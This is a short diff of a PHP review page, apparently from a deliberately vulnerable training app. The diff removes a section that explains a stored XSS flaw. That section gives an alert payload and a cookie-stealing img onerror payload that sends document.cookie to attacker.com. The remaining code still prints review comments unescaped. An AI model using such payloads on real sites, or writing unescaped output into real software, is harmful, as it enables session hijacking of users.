@@ -48,15 +48,6 @@ $reviews = get_reviews();
                 <div class="review-comment"><?= $review['comment'] ?></div>
             </div>
         <?php endforeach; ?>
-        
-        <div class="vuln-section">
-            <h3>Stored XSS Vulnerability</h3>
-            <p>This review system is vulnerable to stored XSS attacks.</p>
-            <p>Try this payload in the "Your Name" field:</p>
-            <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
-            <p>Or for session stealing:</p>
-            <code>&lt;img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)"&gt;</code>
-        </div>
     </div>
 </div>
 
